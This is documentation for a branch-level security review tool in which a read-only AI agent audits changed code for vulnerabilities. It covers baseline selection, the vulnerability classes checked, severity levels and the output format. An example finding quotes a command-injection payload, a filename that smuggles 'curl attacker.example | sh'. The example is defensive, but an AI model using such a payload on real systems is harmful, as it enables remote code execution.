# Security review

A security review audits what your branch changed, not what your repository contains. It collects everything since the branch's baseline — commits, staged changes, unstaged edits, and files you have not added yet — and hands it to a read-only agent that looks for vulnerabilities the change introduced. A weakness that already existed and that the branch merely moved past is left alone, so what comes back is a list you can act on before you open a pull request.

Run it from the Programs panel as `run_security_review`, or call it from Python:

```python
from openprogram.programs.functions.agentic.workflow.security_review import run_security_review

result = run_security_review()
```

## Choosing the baseline

With no `base` argument, the baseline is picked the way a reviewer would pick it:

1. the merge base with the branch's configured upstream — what the branch will actually be compared against when it is proposed;
2. failing that, the merge base with a default branch (`origin/HEAD`, `origin/main`, `origin/master`, then their local names) — the same answer for a branch that has not been pushed yet.

A repository with neither raises `NoBaselineError` naming what was missing. It does not fall back to `HEAD~1` or the root commit: a guessed range reviews the wrong changes and says nothing about having done so. Pass the baseline yourself when you want a specific range:

```python
run_security_review(base="v2.1.0")
```

## What is collected

One diff against the working tree, so committed, staged and unstaged changes all land in the same review — you get the same answer whether or not you committed first. Untracked files are diffed in as well, because a new file is where a hardcoded secret is most likely to be and a plain diff cannot see it. Ignored files stay out, so build output and vendored trees never enter the review, and the index you are composing is never touched.

A branch with nothing changed returns no findings immediately, without spending an agent turn. A diff too large to review in one pass is truncated with the cut stated in the prompt, so the reviewer reports on what it actually saw.

## What is reviewed

The reviewer works through these classes against the changed code:

| Class | Examples |
|---|---|
| Injection | SQL built by concatenation, `shell=True` with interpolated arguments, path traversal, SSRF, template and header injection |
| Authentication and authorization | A new route without its siblings' check, an object fetched by request id without an ownership check, a role or tenant check weakened or moved after the effect it guards |
| Secrets and sensitive data | Keys and tokens hardcoded or committed to fixtures, credentials written to logs or exception text, secrets passed as command-line arguments |
| Unsafe deserialization and dynamic execution | `pickle`, `yaml.load` without `SafeLoader`, `eval` and `exec`, dispatch on caller-supplied attribute names, XML with external entities |
| Concurrency and TOCTOU | A check separated from the action it guards, shared state touched without a lock, temp files created by name |
| Resource exhaustion | Unbounded reads and archive extraction, caller-controlled allocation sizes, catastrophic regex backtracking, missing outbound timeouts |
| Dependencies and supply chain | A new dependency unpinned or from a non-canonical index, a build step piping a remote script to a shell, verification disabled |
| Error handling and disclosure | Stack traces and internal paths returned to callers, swallowed exceptions that turn a failed check into a success |

The diff is a window rather than the whole program, so the reviewer reads the surrounding source before deciding: where the input comes from, whether it is validated upstream, who calls the function, what the sink does. That is what separates a dangerous-looking pattern that is fine in context from a plain-looking line that is a bug once you see its caller.

## Read-only by construction

The review agent gets `read`, `grep`, `glob`, `list` and `bash` — no `write`, `edit`, `apply_patch`, or agent spawning. A reviewer that can write is a reviewer that can "fix" what it thinks it found, and a security opinion is worth nothing if producing it changed the thing under review. Fixes come back as recommendations for you to apply.

## What it returns

```python
{"base": "a1b2c3d…", "files_reviewed": 7, "findings": [
    {"severity": "critical",
     "file": "api/users.py",
     "line": 42,
     "title": "Command injection through the export filename",
     "scenario": "An authenticated caller sets filename to `x; curl attacker.example | sh`; the value reaches subprocess with shell=True and runs as the service account.",
     "recommendation": "Pass the argument list to subprocess without shell=True, and reject filenames outside [A-Za-z0-9._-]."},
]}
```

Findings come ordered with `critical` first. Severity is about consequence:

| Severity | Meaning |
|---|---|
| `critical` | Remote code execution, authentication bypass, or mass data exposure, reachable unauthenticated |
| `high` | Privilege escalation, exposure of another user's data, or a leaked live credential |
| `medium` | Exploitable only with valid credentials, an unlikely configuration, or another bug chained in |
| `low` | Hardening: defence in depth, a weak default, information mildly useful to an attacker |

Every finding carries a concrete triggering scenario — who sends what, through which entry point, and what they get. A finding whose scenario cannot be written is dropped rather than reported vaguely.

An empty `findings` list is a normal result and means the change looks clean. The reviewer is told plainly not to promote an observation to a vulnerability in order to have something to report, because a review that invents findings costs you more than one that finds nothing.

## Compared to a code review

This is a security review, not a code review: style, missing tests, and design opinions are out of scope, and so is any weakness the branch did not touch. Use it as the last pass before proposing a change, alongside whatever review your team already runs.
